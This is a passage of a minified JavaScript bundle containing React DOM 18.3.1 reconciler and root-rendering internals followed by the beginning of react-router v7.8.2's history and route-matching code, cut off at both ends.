16:r=e.elementType;e:{switch(Pl(t,e),t=e.pendingProps,i=r._init,r=i(r._payload),e.type=r,i=e.tag=JN(r),t=Qt(r,t),i){case 0:e=oh(null,e,r,t,n);break e;case 1:e=qy(null,e,r,t,n);break e;case 11:e=Wy(null,e,r,t,n);break e;case 14:e=Ky(null,e,r,Qt(r.type,t),n);break e}throw Error(R(306,r,""))}return e;case 0:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:Qt(r,i),oh(t,e,r,i,n);case 1:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:Qt(r,i),qy(t,e,r,i,n);case 3:e:{if(nS(e),t===null)throw Error(R(387));r=e.pendingProps,s=e.memoizedState,i=s.element,Aw(t,e),uu(e,r,null,n);var o=e.memoizedState;if(r=o.element,s.isDehydrated)if(s={element:r,isDehydrated:!1,cache:o.cache,pendingSuspenseBoundaries:o.pendingSuspenseBoundaries,transitions:o.transitions},e.updateQueue.baseState=s,e.memoizedState=s,e.flags&256){i=xs(Error(R(423)),e),e=Gy(t,e,r,n,i);break e}else if(r!==i){i=xs(Error(R(424)),e),e=Gy(t,e,r,n,i);break e}else for(Mt=vr(e.stateNode.containerInfo.firstChild),Nt=e,se=!0,Zt=null,n=Mw(e,null,r,n),e.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if(ms(),r===i){e=Un(t,e,n);break e}it(t,e,r,n)}e=e.child}return e;case 5:return Pw(e),t===null&&th(e),r=e.type,i=e.pendingProps,s=t!==null?t.memoizedProps:null,o=i.children,Yf(r,i)?o=null:s!==null&&Yf(r,s)&&(e.flags|=32),tS(t,e),it(t,e,o,n),e.child;case 6:return t===null&&th(e),null;case 13:return rS(t,e,n);case 4:return Xp(e,e.stateNode.containerInfo),r=e.pendingProps,t===null?e.child=gs(e,null,r,n):it(t,e,r,n),e.child;case 11:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:Qt(r,i),Wy(t,e,r,i,n);case 7:return it(t,e,e.pendingProps,n),e.child;case 8:return it(t,e,e.pendingProps.children,n),e.child;case 12:return it(t,e,e.pendingProps.children,n),e.child;case 10:e:{if(r=e.type._context,i=e.pendingProps,s=e.memoizedProps,o=i.value,te(au,r._currentValue),r._currentValue=o,s!==null)if(on(s.value,o)){if(s.children===i.children&&!yt.current){e=Un(t,e,n);break e}}else for(s=e.child,s!==null&&(s.return=e);s!==null;){var a=s.dependencies;if(a!==null){o=s.child;for(var l=a.firstContext;l!==null;){if(l.context===r){if(s.tag===1){l=Bn(-1,n&-n),l.tag=2;var u=s.updateQueue;if(u!==null){u=u.shared;var c=u.pending;c===null?l.next=l:(l.next=c.next,c.next=l),u.pending=l}}s.lanes|=n,l=s.alternate,l!==null&&(l.lanes|=n),nh(s.return,n,e),a.lanes|=n;break}l=l.next}}else if(s.tag===10)o=s.type===e.type?null:s.child;else if(s.tag===18){if(o=s.return,o===null)throw Error(R(341));o.lanes|=n,a=o.alternate,a!==null&&(a.lanes|=n),nh(o,n,e),o=s.sibling}else o=s.child;if(o!==null)o.return=s;else for(o=s;o!==null;){if(o===e){o=null;break}if(s=o.sibling,s!==null){s.return=o.return,o=s;break}o=o.return}s=o}it(t,e,i.children,n),e=e.child}return e;case 9:return i=e.type,r=e.pendingProps.children,as(e,n),i=qt(i),r=r(i),e.flags|=1,it(t,e,r,n),e.child;case 14:return r=e.type,i=Qt(r,e.pendingProps),i=Qt(r.type,i),Ky(t,e,r,i,n);case 15:return Zw(t,e,e.type,e.pendingProps,n);case 17:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:Qt(r,i),Pl(t,e),e.tag=1,xt(r)?(t=!0,iu(e)):t=!1,as(e,n),Yw(e,r,i),ih(e,r,i,n),ah(null,e,r,!0,t,n);case 19:return iS(t,e,n);case 22:return eS(t,e,n)}throw Error(R(156,e.tag))};function wS(t,e){return q1(t,e)}function GN(t,e,n,r){this.tag=t,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=e,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function $t(t,e,n,r){return new GN(t,e,n,r)}function hm(t){return t=t.prototype,!(!t||!t.isReactComponent)}function JN(t){if(typeof t=="function")return hm(t)?1:0;if(t!=null){if(t=t.$$typeof,t===Op)return 11;if(t===Dp)return 14}return 2}function br(t,e){var n=t.alternate;return n===null?(n=$t(t.tag,e,t.key,t.mode),n.elementType=t.elementType,n.type=t.type,n.stateNode=t.stateNode,n.alternate=t,t.alternate=n):(n.pendingProps=e,n.type=t.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=t.flags&14680064,n.childLanes=t.childLanes,n.lanes=t.lanes,n.child=t.child,n.memoizedProps=t.memoizedProps,n.memoizedState=t.memoizedState,n.updateQueue=t.updateQueue,e=t.dependencies,n.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext},n.sibling=t.sibling,n.index=t.index,n.ref=t.ref,n}function Dl(t,e,n,r,i,s){var o=2;if(r=t,typeof t=="function")hm(t)&&(o=1);else if(typeof t=="string")o=5;else e:switch(t){case Vi:return si(n.children,i,s,e);case Rp:o=8,i|=8;break;case Nf:return t=$t(12,n,e,i|2),t.elementType=Nf,t.lanes=s,t;case Af:return t=$t(13,n,e,i),t.elementType=Af,t.lanes=s,t;case Pf:return t=$t(19,n,e,i),t.elementType=Pf,t.lanes=s,t;case P1:return Tc(n,i,s,e);default:if(typeof t=="object"&&t!==null)switch(t.$$typeof){case N1:o=10;break e;case A1:o=9;break e;case Op:o=11;break e;case Dp:o=14;break e;case nr:o=16,r=null;break e}throw Error(R(130,t==null?t:typeof t,""))}return e=$t(o,n,e,i),e.elementType=t,e.type=r,e.lanes=s,e}function si(t,e,n,r){return t=$t(7,t,r,e),t.lanes=n,t}function Tc(t,e,n,r){return t=$t(22,t,r,e),t.elementType=P1,t.lanes=n,t.stateNode={isHidden:!1},t}function Pd(t,e,n){return t=$t(6,t,null,e),t.lanes=n,t}function Rd(t,e,n){return e=$t(4,t.children!==null?t.children:[],t.key,e),e.lanes=n,e.stateNode={containerInfo:t.containerInfo,pendingChildren:null,implementation:t.implementation},e}function YN(t,e,n,r,i){this.tag=e,this.containerInfo=t,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=dd(0),this.expirationTimes=dd(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=dd(0),this.identifierPrefix=r,this.onRecoverableError=i,this.mutableSourceEagerHydrationData=null}function pm(t,e,n,r,i,s,o,a,l){return t=new YN(t,e,n,a,l),e===1?(e=1,s===!0&&(e|=8)):e=0,s=$t(3,null,null,e),t.current=s,s.stateNode=t,s.memoizedState={element:r,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},Qp(s),t}function QN(t,e,n){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:Bi,key:r==null?null:""+r,children:t,containerInfo:e,implementation:n}}function SS(t){if(!t)return Pr;t=t._reactInternals;e:{if(Mi(t)!==t||t.tag!==1)throw Error(R(170));var e=t;do{switch(e.tag){case 3:e=e.stateNode.context;break e;case 1:if(xt(e.type)){e=e.stateNode.__reactInternalMemoizedMergedChildContext;break e}}e=e.return}while(e!==null);throw Error(R(171))}if(t.tag===1){var n=t.type;if(xt(n))return Sw(t,n,e)}return e}function kS(t,e,n,r,i,s,o,a,l){return t=pm(n,r,!0,t,i,s,o,a,l),t.context=SS(null),n=t.current,r=at(),i=kr(n),s=Bn(r,i),s.callback=e??null,wr(n,s,i),t.current.lanes=i,ka(t,i,r),vt(t,r),t}function Mc(t,e,n,r){var i=e.current,s=at(),o=kr(i);return n=SS(n),e.context===null?e.context=n:e.pendingContext=n,e=Bn(s,o),e.payload={element:t},r=r===void 0?null:r,r!==null&&(e.callback=r),t=wr(i,e,o),t!==null&&(rn(t,i,o,s),Ml(t,i,o)),o}function yu(t){if(t=t.current,!t.child)return null;switch(t.child.tag){case 5:return t.child.stateNode;default:return t.child.stateNode}}function i0(t,e){if(t=t.memoizedState,t!==null&&t.dehydrated!==null){var n=t.retryLane;t.retryLane=n!==0&&n<e?n:e}}function mm(t,e){i0(t,e),(t=t.alternate)&&i0(t,e)}function XN(){return null}var bS=typeof reportError=="function"?reportError:function(t){console.error(t)};function gm(t){this._internalRoot=t}Nc.prototype.render=gm.prototype.render=function(t){var e=this._internalRoot;if(e===null)throw Error(R(409));Mc(t,e,null,null)};Nc.prototype.unmount=gm.prototype.unmount=function(){var t=this._internalRoot;if(t!==null){this._internalRoot=null;var e=t.containerInfo;xi(function(){Mc(null,t,null,null)}),e[$n]=null}};function Nc(t){this._internalRoot=t}Nc.prototype.unstable_scheduleHydration=function(t){if(t){var e=ew();t={blockedOn:null,target:t,priority:e};for(var n=0;n<ar.length&&e!==0&&e<ar[n].priority;n++);ar.splice(n,0,t),n===0&&nw(t)}};function ym(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11)}function Ac(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11&&(t.nodeType!==8||t.nodeValue!==" react-mount-point-unstable "))}function s0(){}function ZN(t,e,n,r,i){if(i){if(typeof r=="function"){var s=r;r=function(){var u=yu(o);s.call(u)}}var o=kS(e,r,t,0,null,!1,!1,"",s0);return t._reactRootContainer=o,t[$n]=o.current,Wo(t.nodeType===8?t.parentNode:t),xi(),o}for(;i=t.lastChild;)t.removeChild(i);if(typeof r=="function"){var a=r;r=function(){var u=yu(l);a.call(u)}}var l=pm(t,0,!1,null,null,!1,!1,"",s0);return t._reactRootContainer=l,t[$n]=l.current,Wo(t.nodeType===8?t.parentNode:t),xi(function(){Mc(e,l,n,r)}),l}function Pc(t,e,n,r,i){var s=n._reactRootContainer;if(s){var o=s;if(typeof i=="function"){var a=i;i=function(){var l=yu(o);a.call(l)}}Mc(e,o,t,i)}else o=ZN(n,e,t,i,r);return yu(o)}X1=function(t){switch(t.tag){case 3:var e=t.stateNode;if(e.current.memoizedState.isDehydrated){var n=so(e.pendingLanes);n!==0&&(jp(e,n|1),vt(e,be()),!(Q&6)&&(vs=be()+500,Fr()))}break;case 13:xi(function(){var r=Hn(t,1);if(r!==null){var i=at();rn(r,t,1,i)}}),mm(t,1)}};Fp=function(t){if(t.tag===13){var e=Hn(t,134217728);if(e!==null){var n=at();rn(e,t,134217728,n)}mm(t,134217728)}};Z1=function(t){if(t.tag===13){var e=kr(t),n=Hn(t,e);if(n!==null){var r=at();rn(n,t,e,r)}mm(t,e)}};ew=function(){return Z};tw=function(t,e){var n=Z;try{return Z=t,e()}finally{Z=n}};zf=function(t,e,n){switch(e){case"input":if(Df(t,n),e=n.name,n.type==="radio"&&e!=null){for(n=t;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+e)+'][type="radio"]'),e=0;e<n.length;e++){var r=n[e];if(r!==t&&r.form===t.form){var i=wc(r);if(!i)throw Error(R(90));O1(r),Df(r,i)}}}break;case"textarea":L1(t,n);break;case"select":e=n.value,e!=null&&ns(t,!!n.multiple,e,!1)}};_1=cm;$1=xi;var e2={usingClientEntryPoint:!1,Events:[Ca,Hi,wc,V1,z1,cm]},Qs={findFiberByHostInstance:Gr,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},t2={bundleType:Qs.bundleType,version:Qs.version,rendererPackageName:Qs.rendererPackageName,rendererConfig:Qs.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Gn.ReactCurrentDispatcher,findHostInstanceByFiber:function(t){return t=W1(t),t===null?null:t.stateNode},findFiberByHostInstance:Qs.findFiberByHostInstance||XN,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var sl=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!sl.isDisabled&&sl.supportsFiber)try{gc=sl.inject(t2),yn=sl}catch{}}Pt.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=e2;Pt.createPortal=function(t,e){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!ym(e))throw Error(R(200));return QN(t,e,null,n)};Pt.createRoot=function(t,e){if(!ym(t))throw Error(R(299));var n=!1,r="",i=bS;return e!=null&&(e.unstable_strictMode===!0&&(n=!0),e.identifierPrefix!==void 0&&(r=e.identifierPrefix),e.onRecoverableError!==void 0&&(i=e.onRecoverableError)),e=pm(t,1,!1,null,null,n,!1,r,i),t[$n]=e.current,Wo(t.nodeType===8?t.parentNode:t),new gm(e)};Pt.findDOMNode=function(t){if(t==null)return null;if(t.nodeType===1)return t;var e=t._reactInternals;if(e===void 0)throw typeof t.render=="function"?Error(R(188)):(t=Object.keys(t).join(","),Error(R(268,t)));return t=W1(e),t=t===null?null:t.stateNode,t};Pt.flushSync=function(t){return xi(t)};Pt.hydrate=function(t,e,n){if(!Ac(e))throw Error(R(200));return Pc(null,t,e,!0,n)};Pt.hydrateRoot=function(t,e,n){if(!ym(t))throw Error(R(405));var r=n!=null&&n.hydratedSources||null,i=!1,s="",o=bS;if(n!=null&&(n.unstable_strictMode===!0&&(i=!0),n.identifierPrefix!==void 0&&(s=n.identifierPrefix),n.onRecoverableError!==void 0&&(o=n.onRecoverableError)),e=kS(e,null,t,1,n??null,i,!1,s,o),t[$n]=e.current,Wo(t),r)for(t=0;t<r.length;t++)n=r[t],i=n._getVersion,i=i(n._source),e.mutableSourceEagerHydrationData==null?e.mutableSourceEagerHydrationData=[n,i]:e.mutableSourceEagerHydrationData.push(n,i);return new Nc(e)};Pt.render=function(t,e,n){if(!Ac(e))throw Error(R(200));return Pc(null,t,e,!1,n)};Pt.unmountComponentAtNode=function(t){if(!Ac(t))throw Error(R(40));return t._reactRootContainer?(xi(function(){Pc(null,null,t,!1,function(){t._reactRootContainer=null,t[$n]=null})}),!0):!1};Pt.unstable_batchedUpdates=cm;Pt.unstable_renderSubtreeIntoContainer=function(t,e,n,r){if(!Ac(n))throw Error(R(200));if(t==null||t._reactInternals===void 0)throw Error(R(38));return Pc(t,e,n,!1,r)};Pt.version="18.3.1-next-f1338f8080-20240426";function CS(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(CS)}catch(t){console.error(t)}}CS(),C1.exports=Pt;var ES=C1.exports;const n2=bp(ES);var TS,o0=ES;TS=o0.createRoot,o0.hydrateRoot;/**
 * react-router v7.8.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */var a0="popstate";function r2(t={}){function e(r,i){let{pathname:s,search:o,hash:a}=r.location;return vh("",{pathname:s,search:o,hash:a},i.state&&i.state.usr||null,i.state&&i.state.key||"default")}function n(r,i){return typeof i=="string"?i:ea(i)}return s2(e,n,null,t)}function fe(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}function kn(t,e){if(!t){typeof console<"u"&&console.warn(e);try{throw new Error(e)}catch{}}}function i2(){return Math.random().toString(36).substring(2,10)}function l0(t,e){return{usr:t.state,key:t.key,idx:e}}function vh(t,e,n=null,r){return{pathname:typeof t=="string"?t:t.pathname,search:"",hash:"",...typeof e=="string"?Ds(e):e,state:n,key:e&&e.key||r||i2()}}function ea({pathname:t="/",search:e="",hash:n=""}){return e&&e!=="?"&&(t+=e.charAt(0)==="?"?e:"?"+e),n&&n!=="#"&&(t+=n.charAt(0)==="#"?n:"#"+n),t}function Ds(t){let e={};if(t){let n=t.indexOf("#");n>=0&&(e.hash=t.substring(n),t=t.substring(0,n));let r=t.indexOf("?");r>=0&&(e.search=t.substring(r),t=t.substring(0,r)),t&&(e.pathname=t)}return e}function s2(t,e,n,r={}){let{window:i=document.defaultView,v5Compat:s=!1}=r,o=i.history,a="POP",l=null,u=c();u==null&&(u=0,o.replaceState({...o.state,idx:u},""));function c(){return(o.state||{idx:null}).idx}function d(){a="POP";let x=c(),g=x==null?null:x-u;u=x,l&&l({action:a,location:y.location,delta:g})}function f(x,g){a="PUSH";let v=vh(y.location,x,g);u=c()+1;let w=l0(v,u),b=y.createHref(v);try{o.pushState(w,"",b)}catch(k){if(k instanceof DOMException&&k.name==="DataCloneError")throw k;i.location.assign(b)}s&&l&&l({action:a,location:y.location,delta:1})}function h(x,g){a="REPLACE";let v=vh(y.location,x,g);u=c();let w=l0(v,u),b=y.createHref(v);o.replaceState(w,"",b),s&&l&&l({action:a,location:y.location,delta:0})}function p(x){return o2(x)}let y={get action(){return a},get location(){return t(i,o)},listen(x){if(l)throw new Error("A history only accepts one active listener");return i.addEventListener(a0,d),l=x,()=>{i.removeEventListener(a0,d),l=null}},createHref(x){return e(i,x)},createURL:p,encodeLocation(x){let g=p(x);return{pathname:g.pathname,search:g.search,hash:g.hash}},push:f,replace:h,go(x){return o.go(x)}};return y}function o2(t,e=!1){let n="http://localhost";typeof window<"u"&&(n=window.location.origin!=="null"?window.location.origin:window.location.href),fe(n,"No window.location.(origin|href) available to create URL");let r=typeof t=="string"?t:ea(t);return r=r.replace(/ $/,"%20"),!e&&r.startsWith("//")&&(r=n+r),new URL(r,n)}function MS(t,e,n="/"){return a2(t,e,n,!1)}function a2(t,e,n,r){let i=typeof e=="string"?Ds(e):e,s=Wn(i.pathname||"/",n);if(s==null)return null;let o=NS(t);l2(o);let a=null;for(let l=0;a==null&&l<o.length;++l){let u=v2(s);a=y2(o[l],u,r)}return a}function NS(t,e=[],n=[],r="",i=!1){let s=(o,a,l=i,u)=>{let c={relativePath:u===void 0?o.path||"":u,caseSensitive:o.caseSensitive===!0,childrenIndex:a,route:o};if(c.relativePath.startsWith("/")){if(!c.relativePath.startsWith(r)&&l)return;fe(c.relativePath.startsWith(r),`Absolute route path "${c.relativePath}" nested under path "${r}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),c.relativePath=c.relativePath.slice(r.length)}let d=Vn([r,c.relativePath]),f=n.concat(c);o.children&&o.children.length>0&&(fe(o.index!==!0,`Index routes must not have child routes. Please remove all child routes from route path "${d}".`),NS(o.children,e,f,d,l)),!(o.path==null&&!o.index)&&e.push({path:d,score:m2(d,o.index),routesMeta:f})};return t.forEach((o,a)=>{var l;if(o.path===""||!((l=o.path)!=null&&l.includes("?")))s(o,a);else for(let u of AS(o.path))s(o,a,!0,u)}),e}function AS(t){let e=t.split("/");if(e.length===0)return[];let[n,...r]=e,i=n.endsWith("?"),s=n.replace(/\?$/,"");if(r.length===0)return i?[s,""]:[s];let o=AS(r.join("/")),a=[];return a.push(...o.map(l=>l===""?s:[s,l].join("/"))),i&&a.push(...o),a.map(l=>t.startsWith("/")&&l===""?"/":l)}function l2(t){t.sort((e,n)=>e.score!==n.score?n.score-e.score:g2(e.routesMeta.map(r=>r.childrenIndex),n.routesMeta.map(r=>r.childrenIndex)))}var u2=/^:[\w-]+$/,c2=3,d2=2,f2=1,h2=10,p2=-2,u0=t=>t==="*";function m2(t,e){let n=t.split("/"),r=n.length;return n.some(u0)&&(r+=p2),e&&(r+=d2),n.filter(i=>!u0(i)).reduce((i,s)=>i+(u2.test(s)?c2:s===""?f2:h2),r)}function g2(t,e){return t.length===e.length&&t.slice(0,-1).every((r,i)=>r===e[i])?t[t.length-1]-e[e.length-1]:0}function y2(t,e,n=!1){let{routesMeta:r}=t,i={},s="/",o=[];for(let a=0;a<r.length;++a){let l=r[a],u=a===r.length-1,c=s==="/"?e:e.slice(s.length)||"/",d=xu({path:l.relativePath,caseSensitive:l.caseSensitive,end:u},c),f=l.route;if(!d&&u&&n&&!r[r.length-1].route.index&&(d=xu({path:l.relativePath,caseSensitive:l.caseSensitive,end:!1},c)),!d)return null;Object.assign(i,d.params),o.push({params:i,pathname:Vn([s,d.pathname]),pathnameBase:b2(Vn([s,d.pathnameBase])),route:f}),d.pathnameBase!=="/"&&(s=Vn([s,d.pathnameBase]))}return o}function xu(t,e){typeof t=="string"&&(t={path:t,caseSensitive:!1,end:!0});let[n,r]=x2(t.path,t.caseSensitive,t.end),i=e.match(n);if(!i)return null;let s=i[0],o=s.replace(/(.)\/+$/,"$1"),a=i.slice(1);return{params:r.reduce((u,{paramName:c,isOptional:d},f)=>{if(c==="*"){let p=a[f]||"";o=s.slice(0,s.length-p.length).replace(/(.)\/+$/,"$1")}const h=a[f];return d&&!h?u[c]=void 0:u[c]=(h||"").replace(/%2F/g,"/"),u},{}),pathname:s,pathnameBase:o,pattern:t}}function x2(t,e=!1,n=!0){kn(t==="*"||!t.endsWith("*")||t.endsWith("/*"),`Route path "${t}" will be treated as if it were "${t.replace(/\*$/,"/*")}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${t.replace(/\*$/,"/*")}".`);let r=[],i="^"+t.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(o,a,l)=>(r.push({paramName:a,isOptional:l!=null}),l?"/?([^\\/]+)?":"/([^\\/]+)")).replace(/\/([\w-]+)\?(\/|$)/g,"(/$1)?$2");return t.endsWith("*")?(r.push({paramName:"*"}),i+=t==="*"||t==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?i+="\\/*$":t!==""&&t!=="/"&&(i+="(?:(?=\\/|$))"),[new RegExp(i,e?void 0:"i"),r]}function v2(t){try{return t.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(e){return kn(!1,`The URL path "${t}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${e}).`),t}}function Wn(t,e){if(e==="/")return t;if(!t.toLowerCase().startsWith(e.toLowerCase()))return null;let n=e.endsWith("/")?e.length-1:e.length,r=t.charAt(n);return r&&r!=="/"?null:t.slice(n)||"/"}function w2(t,e="/"){let{pathname:n,search:r="",hash:i=""}=typeof t=="string"?Ds(t):t;return{pathname:n?n.startsWith("/")?n:S2(n,e):e,search:C2(r),hash:E2(i)}}function S2(t,e){let n=e.replace(/\/+$/,"").split("/");return t.split("/").forEach(i=>{i===".."?n.length>1&&n.pop():i!=="."&&n.push(i)}),n.length>1?n.join("/"):"/"}function Od(t,e,n,r){return`Cannot include a '${t}' character in a manually specified \`to.${e}\` field [${JSON.stringify(r)}].  Please separate it out to the \`to.${n}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`}function k2(t){return t.filter((e,n)=>n===0||e.route.path&&e.route.path.length>0)}function PS(t){let e=k2(t);return e.map((n,r)=>r===e.length-1?n.pathname:n.pathnameBase)}function RS(t,e,n,r=!1){let i;typeof t=="string"?i=Ds(t):(i={...t},fe(!i.pathname||!i.pathname.includes("?"),Od("?","pathname","search",i)),fe(!i.pathname||!i.pathname.includes("#"),Od("#","pathname","hash",i)),fe(!i.search||!i.search.includes("#"),Od("#","search","hash",i)));let s=t===""||i.pathname==="",o=s?"/":i.pathname,a;if(o==null)a=n;else{let d=e.length-1;if(!r&&o.startsWith("..")){let f=o.split("/");for(;f[0]==="..";)f.shift(),d-=1;i.pathname=f.join("/")}a=d>=0?e[d]:"/"}let l=w2(i,a),u=o&&o!=="/"&&o.endsWith("/"),c=(s||o===".")&&n.endsWith("/");return!l.pathname.endsWith("/")&&(u||c)&&(l.pathname+="/"),l}var Vn=t=>t.join("/").replace(/\/\/+/g,"/"),b2=t=>t.replace(/\/+$/,"").replace(/^\/*/,"/"),C2=t=>!t||t==="?"?"":t.startsWith("?")?t:"?"+t,E2=t=>!t||t==="#"?"":t.startsWith("#")?t:"#"+t;function T2(t){return t!=null&&typeof t.status=="number"&&typeof t.statusText=="string"&&typeof t.internal=="boolean"&&"data"in t}var OS=["POST","PUT","PATCH","DELETE"];new Set(OS);var M2=["GET",...OS];new Set(M2);var Ls=S.createContext(null);Ls.displayName="DataRouter";var Rc=S.createContext(null);Rc.displayName="DataRouterState";S.createContext(!1);var DS=S.createContext({isTransitioning:!1});DS.displayName="ViewTransition";var N2=S.createContext(new Map);N2.displayName="Fetchers";var A2=S.createContext(null);A2.displayName="Await";var En=S.createContext(null);En.displayName="Navigation";var Ta=S.createContext(null);Ta.displayName="Location";var Tn=S.createContext({outlet:null,matches:[],isDataRoute:!1});Tn.displayName="Route";var xm=S.createContext(null);xm.displayName="RouteError";function P2(t,{relative:e}={}){fe(Ma(),"useHref() may be used only in the context of a <Router> component.");let{basename:n,navigator:r}=S.useContext(En),{hash:i,pathname:s,search:o}=Na(t,{relative:e}),a=s;return n!=="/"&&(a=s==="/"?n:Vn([n,s])),r.createHref({pathname:a,search:o,hash:i})}function Ma(){return S.useContext(Ta)!=null}function Ni(){return fe(Ma(),"useLocation() may be used only in the context of a <Router> component."),S.useContext(Ta).location}var LS="You should call navigate() in a React.useEffect(), not when your component is first rendered.";function IS(t){S.useContext(En).static||S.useLayoutEffect(t)}function Is(){let{isDataRoute:t}=S.useContext(Tn);return t?H2():R2()}function R2(){fe(Ma(),"useNavigate() may be used only in the context of a <Router> component.");let t=S.useContext(Ls),{basename:e,navigator:n}=S.useContext(En),{matches:r}=S.useContext(Tn),{pathname:i}=Ni(),s=JSON.stringify(PS(r)),o=S.useRef(!1);return IS(()=>{o.current=!0}),S.useCallback((l,u={})=>{if(kn(o.current,LS),!o.current)return;if(typeof l=="number"){n.go(l);return}let c=RS(l,JSON.parse(s),i,u.relative==="path");t==null&&e!=="/"&&(c.pathname=c.pathname==="/"?e:Vn([e,c.pathname])),(u.replace?n.replace:n.push)(c,u.state,u)},[e,n,s,i,t])}S.createContext(null);function vm(){let{matches:t}=S.useContext(Tn),e=t[t.length-1];return e?e.params:{}}function Na(t,{relative:e}={}){let{matches:n}=S.useContext(Tn),{pathname:r}=Ni(),i=JSON.stringify(PS(n));return S.useMemo(()=>RS(t,JSON.parse(i),r,e==="path"),[t,i,r,e])}function O2(t,e){return jS(t,e)}function jS(t,e,n,r,i){var v;fe(Ma(),"useRoutes() may be used only in the context of a <Router> component.");let{navigator:s}=S.useContext(En),{matches:o}=S.useContext(Tn),a=o[o.length-1],l=a?a.params:{},u=a?a.pathname:"/",c=a?a.pathnameBase:"/",d=a&&a.route;{let w=d&&d.path||"";FS(u,!d||w.endsWith("*")||w.endsWith("*?"),`You rendered descendant <Routes> (or called \`useRoutes()\`) at "${u}" (under <Route path="${w}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${w}"> to <Route path="${w==="/"?"*":`${w}/*`}">.`)}let f=Ni(),h;if(e){let w=typeof e=="string"?Ds(e):e;fe(c==="/"||((v=w.pathname)==null?void 0:v.startsWith(c)),`When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${c}" but pathname "${w.pathname}" was given in the \`location\` prop.`),h=w}else h=f;let p=h.pathname||"/",y=p;if(c!=="/"){let w=c.replace(/^\//,"").split("/");y="/"+p.replace(/^\//,"").split("/").slice(w.length).join("/")}let x=MS(t,{pathname:y});kn(d||x!=null,`No routes matched location "${h.pathname}${h.search}${h.hash}" `),kn(x==null||x[x.length-1].route.element!==void 0||x[x.length-1].route.Component!==void 0||x[x.length-1].route.lazy!==void 0,`Matched leaf route at location "${h.pathname}${h.search}${h.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);let g=F2(x&&x.map(w=>Object.assign({},w,{params:Object.assign({},l,w.params),pathname:Vn([c,s.encodeLocation?s.encodeLocation(w.pathname).pathname:w.pathname]),pathnameBase:w.pathnameBase==="/"?c:Vn([c,s.encodeLocation?s.encodeLocation(w.pathnameBase).pathname:w.pathnameBase])})),o,n,r,i);return e&&g?S.createElement(Ta.Provider,{value:{location:{pathname:"/",search:"",hash:"",state:null,key:"default",...h},navigationType:"POP"}},g):g}function D2(){let t=$2(),e=T2(t)?`${t.status} ${t.statusText}`:t instanceof Error?t.message:JSON.stringify(t),n=t instanceof Error?t.stack:null,r="rgba(200,200,200, 0.5)",i={padding:"0.5rem",backgroundColor:r},s={padding:"2px 4px",backgroundColor:r},o=null;return console.error("Error handled by React Router default ErrorBoundary:",t),o=S.createElement(S.Fragment,null,S.createElement("p",null," Hey developer "),S.createElement("p",null,"You can provide a way better UX than this when your app throws errors by providing your own ",S.createElement("code",{style:s},"ErrorBoundary")," or"," ",S.createElement("code",{style:s},"errorElement")," prop on your route.")),S.createElement(S.Fragment,null,S.createElement("h2",null,"Unexpected Application Error!"),S.createElement("h3",{style:{fontStyle:"italic"}},e),n?S.createElement("pre",{style:i},n):null,o)}var L2=S.createElement(D2,null),I2=class extends S.Component{constructor(t){super(t),this.state={location:t.location,revalidation:t.revalidation,error:t.error}}static getDerivedStateFromError(t){return{error:t}}static getDerivedStateFromProps(t,e){return e.location!==t.location||e.revalidation!=="idle"&&t.revalidation==="idle"?{error:t.error,location:t.location,revalidation:t.revalidation}:{error:t.error!==void 